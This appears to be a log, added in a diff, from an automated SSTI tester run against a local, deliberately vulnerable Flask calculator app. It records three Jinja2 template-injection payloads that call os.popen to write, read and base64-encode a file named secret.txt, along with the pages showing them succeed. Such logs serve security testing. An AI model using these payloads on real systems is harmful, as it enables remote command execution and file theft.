@@ -1,0 +1,413 @@
+[1] Payload: {{config.__class__.__init__.__globals__['os'].popen("echo 123:123 > D:\\secret.txt").read()}}
+    Target: http://127.0.0.1:5000/calc/
+    Method: POST
+    Status: selenium fallback
+    Error: 
+    Response (preview):
+<html lang="ru"><head>
+    <meta charset="UTF-8">
+    <title>SSTI Calculator</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="/static/script.js" defer=""></script>
+</head>
+<body>
+<div class="wrapper">
+    <header>
+        <h1>Калькулятор</h1>
+        <div class="user-info">Пользователь: <strong>Гость</strong></div>
+    </header>
+
+    <main>
+        <section class="card">
+            <form method="post" class="calc-form">
+                <input type="text" id="code" n
+    Full HTML:
+<html lang="ru"><head>
+    <meta charset="UTF-8">
+    <title>SSTI Calculator</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="/static/script.js" defer=""></script>
+</head>
+<body>
+<div class="wrapper">
+    <header>
+        <h1>Калькулятор</h1>
+        <div class="user-info">Пользователь: <strong>Гость</strong></div>
+    </header>
+
+    <main>
+        <section class="card">
+            <form method="post" class="calc-form">
+                <input type="text" id="code" name="code" value="{{config.__class__.__init__.__globals__['os'].popen(&quot;echo 123:123 > D:\\secret.txt&quot;).read()}}" placeholder="0" autocomplete="off" autofocus="">
+
+                <div class="digits">
+                    
+                        
+                            <button type="button" class="btn-input">7</button>
+                        
+                            <button type="button" class="btn-input">8</button>
+                        
+                            <button type="button" class="btn-input">9</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">4</button>
+                        
+                            <button type="button" class="btn-input">5</button>
+                        
+                            <button type="button" class="btn-input">6</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">1</button>
+                        
+                            <button type="button" class="btn-input">2</button>
+                        
+                            <button type="button" class="btn-input">3</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">0</button>
+                        
+                            <button type="button" class="btn-input">.</button>
+                        
+                            <button type="button" class="btn-input">(</button>
+                        
+                    
+                </div>
+
+                <div class="operators">
+                    
+                        <button type="button" class="btn-input operator">+</button>
+                    
+                        <button type="button" class="btn-input operator">-</button>
+                    
+                        <button type="button" class="btn-input operator">*</button>
+                    
+                        <button type="button" class="btn-input operator">/</button>
+                    
+                        <button type="button" class="btn-input operator">)</button>
+                    
+                    <button type="submit" class="btn-equal">=</button>
+                    <button type="button" id="clear">C</button>
+                </div>
+            </form>
+        </section>
+
+        <section class="card">
+            <h3>Результат:</h3>
+            <div class="output"></div>
+        </section>
+
+
+        <section class="card">
+            <h3>История:</h3>
+            <ul class="history-list">
+                
+                    <li class="history-item">{{'ab'|cut:'b'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{'hello'|length}} = 5</li>
+                
+                    <li class="history-item">{{123456|slice:':3'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{'HELLO'|lower}} = hello</li>
+                
+                    <li class="history-item">{{'xyz'|yesno:'Y,N'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{''|yesno:'yes,no'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{5|divisibleby:5}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{4|add:-2}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{None|default:'empty'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{config.__class__.__init__.__globals__['os'].popen("echo 123:123 &gt; D:\\secret.txt").read()}} =</li>
+                
+            </ul>
+        </section>
+    </main>
+
+    <footer>
+        <a href="/">⬅ На главную</a>
+    </footer>
+</div>
+
+</body></html>
+============================================================
+[2] Payload: {{config.__class__.__init__.__globals__['os'].popen("type D:\\secret.txt").read()}}
+    Target: http://127.0.0.1:5000/calc/
+    Method: POST
+    Status: selenium fallback
+    Error: 
+    Response (preview):
+<html lang="ru"><head>
+    <meta charset="UTF-8">
+    <title>SSTI Calculator</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="/static/script.js" defer=""></script>
+</head>
+<body>
+<div class="wrapper">
+    <header>
+        <h1>Калькулятор</h1>
+        <div class="user-info">Пользователь: <strong>Гость</strong></div>
+    </header>
+
+    <main>
+        <section class="card">
+            <form method="post" class="calc-form">
+                <input type="text" id="code" n
+    Full HTML:
+<html lang="ru"><head>
+    <meta charset="UTF-8">
+    <title>SSTI Calculator</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="/static/script.js" defer=""></script>
+</head>
+<body>
+<div class="wrapper">
+    <header>
+        <h1>Калькулятор</h1>
+        <div class="user-info">Пользователь: <strong>Гость</strong></div>
+    </header>
+
+    <main>
+        <section class="card">
+            <form method="post" class="calc-form">
+                <input type="text" id="code" name="code" value="{{config.__class__.__init__.__globals__['os'].popen(&quot;type D:\\secret.txt&quot;).read()}}" placeholder="0" autocomplete="off" autofocus="">
+
+                <div class="digits">
+                    
+                        
+                            <button type="button" class="btn-input">7</button>
+                        
+                            <button type="button" class="btn-input">8</button>
+                        
+                            <button type="button" class="btn-input">9</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">4</button>
+                        
+                            <button type="button" class="btn-input">5</button>
+                        
+                            <button type="button" class="btn-input">6</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">1</button>
+                        
+                            <button type="button" class="btn-input">2</button>
+                        
+                            <button type="button" class="btn-input">3</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">0</button>
+                        
+                            <button type="button" class="btn-input">.</button>
+                        
+                            <button type="button" class="btn-input">(</button>
+                        
+                    
+                </div>
+
+                <div class="operators">
+                    
+                        <button type="button" class="btn-input operator">+</button>
+                    
+                        <button type="button" class="btn-input operator">-</button>
+                    
+                        <button type="button" class="btn-input operator">*</button>
+                    
+                        <button type="button" class="btn-input operator">/</button>
+                    
+                        <button type="button" class="btn-input operator">)</button>
+                    
+                    <button type="submit" class="btn-equal">=</button>
+                    <button type="button" id="clear">C</button>
+                </div>
+            </form>
+        </section>
+
+        <section class="card">
+            <h3>Результат:</h3>
+            <div class="output">123:123 
+</div>
+        </section>
+
+
+        <section class="card">
+            <h3>История:</h3>
+            <ul class="history-list">
+                
+                    <li class="history-item">{{123456|slice:':3'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{'HELLO'|lower}} = hello</li>
+                
+                    <li class="history-item">{{'xyz'|yesno:'Y,N'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{''|yesno:'yes,no'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{5|divisibleby:5}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{4|add:-2}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{None|default:'empty'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{config.__class__.__init__.__globals__['os'].popen("echo 123:123 &gt; D:\\secret.txt").read()}} =</li>
+                
+                    <li class="history-item">{{config.__class__.__init__.__globals__['os'].popen("type D:\\secret.txt").read()}} = 123:123</li>
+                
+                    <li class="history-item"></li>
+                
+            </ul>
+        </section>
+    </main>
+
+    <footer>
+        <a href="/">⬅ На главную</a>
+    </footer>
+</div>
+
+</body></html>
+============================================================
+[3] Payload: {{config.__class__.__init__.__globals__['os'].popen("powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('D:\\secret.txt'))\"").read()}}
+    Target: http://127.0.0.1:5000/calc/
+    Method: POST
+    Status: selenium fallback
+    Error: 
+    Response (preview):
+<html lang="ru"><head>
+    <meta charset="UTF-8">
+    <title>SSTI Calculator</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="/static/script.js" defer=""></script>
+</head>
+<body>
+<div class="wrapper">
+    <header>
+        <h1>Калькулятор</h1>
+        <div class="user-info">Пользователь: <strong>Гость</strong></div>
+    </header>
+
+    <main>
+        <section class="card">
+            <form method="post" class="calc-form">
+                <input type="text" id="code" n
+    Full HTML:
+<html lang="ru"><head>
+    <meta charset="UTF-8">
+    <title>SSTI Calculator</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="/static/script.js" defer=""></script>
+</head>
+<body>
+<div class="wrapper">
+    <header>
+        <h1>Калькулятор</h1>
+        <div class="user-info">Пользователь: <strong>Гость</strong></div>
+    </header>
+
+    <main>
+        <section class="card">
+            <form method="post" class="calc-form">
+                <input type="text" id="code" name="code" value="{{config.__class__.__init__.__globals__['os'].popen(&quot;powershell -Command \&quot;[Convert]::ToBase64String([IO.File]::ReadAllBytes('D:\\secret.txt'))\&quot;&quot;).read()}}" placeholder="0" autocomplete="off" autofocus="">
+
+                <div class="digits">
+                    
+                        
+                            <button type="button" class="btn-input">7</button>
+                        
+                            <button type="button" class="btn-input">8</button>
+                        
+                            <button type="button" class="btn-input">9</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">4</button>
+                        
+                            <button type="button" class="btn-input">5</button>
+                        
+                            <button type="button" class="btn-input">6</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">1</button>
+                        
+                            <button type="button" class="btn-input">2</button>
+                        
+                            <button type="button" class="btn-input">3</button>
+                        
+                    
+                        
+                            <button type="button" class="btn-input">0</button>
+                        
+                            <button type="button" class="btn-input">.</button>
+                        
+                            <button type="button" class="btn-input">(</button>
+                        
+                    
+                </div>
+
+                <div class="operators">
+                    
+                        <button type="button" class="btn-input operator">+</button>
+                    
+                        <button type="button" class="btn-input operator">-</button>
+                    
+                        <button type="button" class="btn-input operator">*</button>
+                    
+                        <button type="button" class="btn-input operator">/</button>
+                    
+                        <button type="button" class="btn-input operator">)</button>
+                    
+                    <button type="submit" class="btn-equal">=</button>
+                    <button type="button" id="clear">C</button>
+                </div>
+            </form>
+        </section>
+
+        <section class="card">
+            <h3>Результат:</h3>
+            <div class="output">MTIzOjEyMyANCg==
+</div>
+        </section>
+
+
+        <section class="card">
+            <h3>История:</h3>
+            <ul class="history-list">
+                
+                    <li class="history-item">{{'xyz'|yesno:'Y,N'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{''|yesno:'yes,no'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{5|divisibleby:5}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{4|add:-2}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{None|default:'empty'}} = Ошибка: expected token 'end of print statement', got ':'</li>
+                
+                    <li class="history-item">{{config.__class__.__init__.__globals__['os'].popen("echo 123:123 &gt; D:\\secret.txt").read()}} =</li>
+                
+                    <li class="history-item">{{config.__class__.__init__.__globals__['os'].popen("type D:\\secret.txt").read()}} = 123:123</li>
+                
+                    <li class="history-item"></li>
+                
+                    <li class="history-item">{{config.__class__.__init__.__globals__['os'].popen("powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('D:\\secret.txt'))\"").read()}} = MTIzOjEyMyANCg==</li>
+                
+                    <li class="history-item"></li>
+                
+            </ul>
+        </section>
+    </main>
+
+    <footer>
+        <a href="/">⬅ На главную</a>
+    </footer>
+</div>
+
+</body></html>
+============================================================
